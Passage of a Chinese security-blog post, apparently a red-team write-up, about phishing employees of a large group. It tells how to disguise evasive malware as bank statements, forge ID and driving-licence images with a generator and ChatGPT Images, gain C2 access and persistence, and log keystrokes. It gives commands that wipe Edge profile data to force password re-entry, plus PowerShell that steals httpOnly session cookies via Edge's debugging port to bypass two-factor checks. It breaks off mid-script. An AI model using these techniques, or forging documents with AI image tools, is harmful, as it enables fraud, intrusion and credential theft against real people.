---
title: 某大型集团攻防！如何通过一条消息获取目标系统后台管理权限及数据
url: https://mp.weixin.qq.com/s/dCy0Q2VHVLrJG3RfjNSHkA
source: Doonsec's feed
date: 2026-05-05
fetch_date: 2026-05-06T05:08:33.459828
---

# 某大型集团攻防！如何通过一条消息获取目标系统后台管理权限及数据

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/cGhMn4Bj3bb3TQiaW5D34lV4SLyeKiaBswAAZibcqkZOMmiahibJibYkicDXNXQ3jscscx09MbM0ib0on4AAF7Dn4woN3tO19kOcXfibXvUmQysemdVc/0?wx_fmt=jpeg)

# 某大型集团攻防！如何通过一条消息获取目标系统后台管理权限及数据

原创

信益安研究院
信益安研究院

信益安信息安全研究院

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# 微信钓鱼实战案例

## 寻找目标用户

### 在大众点评、美团等平台上寻找目标门店，然后直接打门店电话，加目标用户的wx。

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bZFculwvTWwqZdGGOTEt5mpOmx4aeRbnpmeWaPnXe7shHBJJqeL3fnpf5QmZQruQH77yWJeYUCYvWib1zfNHvZiaprRviaJCqek1k/640?wx_fmt=png&from=appmsg "null")

## 制作钓鱼压缩包

### 首先要明确目标用户的常规业务，然后设计钓鱼文件。比如这里我们知道银行流水很重要，他们一定会点击查看，我们就将免杀好的exe的文件名设置成银行流水。

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bZobKjHBvLrKorlYdogIOsD0eRD2Tb7SaBE3dibbS9BKYh1amnPLPNgJ2IBJrhjYhjicUU9jEmKkApIOPuiaCXiaav7BrP9FXLYVjg/640?wx_fmt=png&from=appmsg "null")

### 还可以给程序加一个可信图标，设置长文件名，降低目标用户的戒心。注意，大多数pc用户都不开文件拓展名，或者即使开启，也不见得对exe有多了解。

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bb36miaGxWOUagFibFeEk7VBg7IjRbXw17kjS9P0GowfVib7rIic2DRgNIJWWvjuT1XIyu0yYBZcs2xSAoO4WJicJwnwhicenIujS73g/640?wx_fmt=png&from=appmsg "null")

### 在制作钓鱼文件的过程中，发现一个有意思的工具，名为idcard\_generator，可以简单伪造身份证件，发给我们目标用户能做到以假乱真，降低目标用户的戒心。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/cGhMn4Bj3bal8CVH9IeSoojF0w1JUhx4AQiaJBjaejJJVia1NHJ6lKVXASXwsLF7yRd41826BPt68QlDPZAFGk7ujnLkQMz9Orib8L1iamz6ReM/640?wx_fmt=png&from=appmsg "null")

### 此外 ChatGPT Images 2.0 在伪造资料方面帮了大忙。图片非常真实，也没有什么安全限制。

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bbvZEAsgFG1TASJ3Sib7Rphfy1HjAt4y1lRXNKGFb7nIe7X6ib25ibhvSVteVFC7YeJl0KhlfjG5oElFHUh1oic0nOGF4FDKiasUEWQ/640?wx_fmt=png&from=appmsg "null")

### 比如，这张伪造的机动车驾驶证。通过社工的方式获取到用户身份信息，将要求和身份信息一并输入给gpt，最终输出这张图片。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/cGhMn4Bj3bYHr1D95YfXiaiam97zA7PDzVBgkU25CHpibxtBzPEsNaTKD3dE94OWKqibzxKH941fSYajibbyRaST0CpM4Z3BfZ3rjicxnZMezNCr4/640?wx_fmt=png&from=appmsg "null")

## 诱骗点击的话术

### 接下来主要就是广撒网，坐等上钩。注意，真正的社工就是你直接说，让目标点击那个文件；虚假的社工才需要想一大堆蹩脚的理由。如下聊天记录供师傅们参考。（会有失败的情况，广撒网就完事！）

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3ba3icZoJkNw5jibqt7SpjLQekbOl9ygMyFvia9tJ7AnEzETvhkXZGn4uJ3Jde0CCbABJKecFbxMNzY3cTkvykusbZ9sePZsuVxibOE/640?wx_fmt=png&from=appmsg)

## 上线c2，开始后渗透

### 吃个饭，回来发现成功上线了一台机器。

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3baoz33xGVGSq0ibySk8bIMlHgaIib7C4eJ7yXaEiap7n4Uiae1pQvLiau6iaPGFBVf81k6u5UVUggHJG18ibJ1TCfhe8kQL2djCF4zibT8/640?wx_fmt=png&from=appmsg)

## 查看杀软发现为Defender

![](https://mmbiz.qpic.cn/sz_mmbiz_png/cGhMn4Bj3bZicLEiaaQmeSO7L8n5QqxV9sib01DYQrRkhP38v2l0lmDQB6mWF4bagMaMviap7Ca4gFe5OyIZv14TrCjH4RRlutFBz0wupxnxRE4/640?wx_fmt=png&from=appmsg "null")

### 跟之前文章一样进程注入到vshell方便监控屏幕：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/cGhMn4Bj3bYIwFe2pJga93tyXeBVAicOYIHCKgdichkNacwRj1ed9iaCb1clwLkfT49Nt3AGWyVOjwglayJibtm2vNtibGRJN7DELpIDlgjat8qs/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bZ8OHeaiblbfyicgpHROc21fLELaricfRS5ibS8CWBCwXoIibApZro68e735QYmow9SdG9W4KNlxDiaMuxEKb9RKN3uNV3eUribqRmib1c/640?wx_fmt=png&from=appmsg)

### 成功上线vshell：

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bZiam4NOOTZ5EUUhyG9RYMXvMkomnnlEMZAJwYmFicR3vhXkrfzic7XmMgs0zwMcpVsQiahLSI8zpHPWO4Edr1AQYdFAo8AzjwadAY/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bYaLfpfKJibLEzPpMsW70OdBiaWvhRWUEee5FiaGiaicpxpAibBUJicRRiaE6xzFmXenTRtLqYMaVRuhDfngAyAicjfCh1YEOO9fTlcWzHY/640?wx_fmt=png&from=appmsg)

## 权限维持：

### 上传个bypass df的木马做个开机自启：

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bYa9SmEDBXUU86U4bTqdvxl9opFAas89J5QJt32Q4ggDYFW8CU6IibOjAZOAl2ODbtaHMgV4HWAQfa1s5DZLkfw96AmPMXria92k/640?wx_fmt=png&from=appmsg)

## 由于也是个人pc没啥别的内网，所以重心也放到数据分上：

### 因为尝试了浏览器解密，很多目标网站的凭据由于密钥的原因没解出来（但是有用户名）：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/cGhMn4Bj3bb61Ed7numHLv7EqYU886pic8JkianMrljn6erKIATA8PibVIG7wibkLD7wVtee1bib5ID5bYjtbQhlQfwxJUsKic5icickph3lKoyulNI/640?wx_fmt=png&from=appmsg)

## 所以换个思路：我们直接先写个键盘记录器的bof，然后把他的浏览器里的cookie信息以及缓存的登录凭据信息全部删掉。然后强制kill掉他的edge浏览器，这样他重新访问这个页面的时候就需要输入账号密码了，就会被我们写的键盘记录器给记录到。

### 首先写个键盘记录器的bof：

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bawg4hia8y0WDJ8Wdcibeb8sowsibqxibAkzVibgr2oJAo3pTYFKiahqhWVjlZV3euW6wWDmTxmDptwhsHicRKwrnZK7Iuq1DqxJMwPfs/640?wx_fmt=png&from=appmsg "null")

### 加载进我们的c2里：

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bb8nGYmHiaO9EmbrkZtsMhgjfNPBZJMlZe3bxaicNcBPTo0dGB052w2F3JiaHsYA6XfA8mn3vvyzSqSHF9pibkHmRv7gTVIpSXJibWE/640?wx_fmt=png&from=appmsg "null")

### 我们自己先在本机测试下效果：

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bavmLrsRpYwhSLToAjbTSsqClRKQB4yHm8zQIowJCxw5ibCKkFCNMQwgYUW2k2FibIJqFoicaMjDlOP1BD8e4r8OCNeib9jSHWcDv8/640?wx_fmt=png&from=appmsg "null")

#### 成功记录到：

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bbLJfM7D6EwAECU5NRKPFiaC1bwDOCE8YHTeMq3KwTIuicC5DI8brib25jNOJicEOkAAdeRMvQkElYnAwyWWFicD2fNjdhURWfTbZU8/640?wx_fmt=png&from=appmsg)

### 然后强制kill掉目标edge进程清空浏览器凭据

#### 注意：这只清空了本地浏览器数据，如果目标登录了微软的账户，那么还是从云端同步回来了部分数据。（也是当时打的时候碰到的这个问题，但是幸运的是目标后面去登录别的网站，且没有缓存的凭据，所以被我们键盘记录器记录到了密码）

```
taskkill /F /T /IM msedge.exe timeout /t 3 /nobreak >nul rd /S /Q "C:\Users\<用户>\AppData\Local\Microsoft\Edge\User Data
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/cGhMn4Bj3bZ6ADK8FKQ6zJISRDSdSFUNtIiaYenmkJHkA019v5J5bMyWQlxu9EibQhk1Wx40kS3ibXHxicB7fdGcbv6jfVX01vlNcBGyY3DHOQY/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/cGhMn4Bj3ba0oAcsRpicltqnG5PfgAEB4smSkwKgRkaA0EG8VrQQaROOGwpR2LhsCBCt56yAmeYoqPAzZ2Chy3BoLL5q8lhuMQmBWmCJWtMU/640?wx_fmt=png&from=appmsg)

#### 然后用之前我们解密浏览器得到的用户名以及监听到的密码复用，成功拿到我们目标网站的凭据。但是恶心人的是要二次验证（其实尝试了给目标打电话社工的形式想拿到验证码，但是安全意识还是有点高的哈哈，值得表扬）：

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bZCqIVPTP4qIUhJicAKIibRB90dwxibnFRUT3oGOPZPMTWBZoVh4wWKLMtKGhx1KZBsKElhGqGS0sicnttKexWd4E1DrKwoNBDY4TM/640?wx_fmt=png&from=appmsg)

## 不慌，脑子一转又有个思路，抓他cookie就完事，直接绕过验证码：（这里由于敏感原因就拿2台电脑做测试模拟下当时的环境）

```
利用 Chrome/Edge 的远程调试功能（CDP），在目标已登录的情况下，通过 WebSocket 连接调试端口，提取 httpOnly Cookie，从而绕过同源策略限制，完整继承目标登录态。
```

### 1.先通过屏幕监控观察目标在edge上已经登录了我们想要的目标网站：

```
因为我们的目的是劫持已认证的 Session，不需要破解密码或绕过验证码。等目标登录完成后，所有认证 Cookie 已写入浏览器，直接提取即可。
```

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3bYAAv3RuUVvC5hvAXjBb1gia3ppBv782daVXyQGHMfZye45PsicibRdv3oXsPIL8zSxdOg6z8UTpYtq5oLxRt8G6cC82YRRIdRoak/640?wx_fmt=png&from=appmsg "null")

### 2.强制重启 Edge 并开启远程调试端口9222

```
可以看到我们的命令是0.0.0.0的9222端口，本意是想做个socks5的代理然后让kali进行后续的流程方便一些，因为很多环境目标机器上都没有，想直接写个脚本搞定后续流程，但是Edge的安全机制在限制监听地址只能绑定localhost（不过也没事，只是麻烦一些，我们直接利用vshell的shell终端在本地弄就行了）
```

![](https://mmbiz.qpic.cn/mmbiz_png/cGhMn4Bj3baYvlKrkETmOBQBwCFhxM72PDmVADZhCqxU6HiaRlCEicUljWiasaAxubSdA2EwyRj8wCMTY78hK1XVQia3AqP1oibzhVjZsDibLUibf8/640?wx_fmt=png&from=appmsg)

### 3.枚举所有打开的 Tab

```
curl http://127.0.0.1:9222/json

//返回结构：JSON 数组，每个元素是一个 Tab，包含：
    - `url`：当前页面 URL
    - `id`：Tab 唯一标识符
    - `webSocketDebuggerUrl`：CDP WebSocket 调试地址
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/cGhMn4Bj3bb6hHiaODib7D4IBagiaJeYFF4BRVcbfichavDZs6Cib25H4rIiasVTEUqicqu2lb9Lib6aOc4EwBRY4J2b5OPnxGM4tkkQU83mia55Kic40/640?wx_fmt=png&from=appmsg)

## 注意：因为目标机器上我们没有python环境，所以后续我们用powershell去实现：

### 4.找到我们想要的目标网站tab的id值（如果对方网站登录的过多，我们就这样过滤一下）

```
$tabs = (Invoke-WebRequest -Uri "http://127.0.0.1:9222/json" -UseBasicParsing).Content | ConvertFrom-Json
$tabId = ($tabs | Where-Object { $_.url -like "*hbswkj.cdvisor.com*" } | Select-Object -First 1).id
//本次目标 Tab ID：`85CDB69A223C96CBF70F7FA05C753E9F`
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/cGhMn4Bj3bZyvibAJDfceMFlHdp16CgKkQLTV1eArzHObYP5q2hwYD3X2tibTpjaW8c8ZsVLUn9FianWpPcrL01yOvZ6kzF75iaTKHNLWJia6J5E/640?wx_fmt=png&from=appmsg)

### 5.通过 CDP WebSocket 提取 Cookie

```
使用 CDP 协议方*：`Network.getCookies`（只返回指定 URL 的 Cookie，比 `getAllCookies` 数据量小）

# 建立 WebSocket 连接
$ws = New-Object System.Net.WebSockets.ClientWebSocket
$uri = [System.Uri]"ws://127.0.0.1:9222/devtools/page/$tabId"
$ct = [System.Threading.CancellationToken]::None
$ws.ConnectAsync($uri, $ct).Wait()

# 发送 getCookies 请求（只取 bst.ctrip.com）
$msg = '{"id":1,"method":"Network.getCookies","params":{"urls":["https://hbswkj.cdvisor.com"]}}'
$bytes = [System.Text.Encoding]::UTF8.GetBytes($msg)
$seg = [System.ArraySegment[byte]]::new($bytes)
$ws.SendAsync($seg...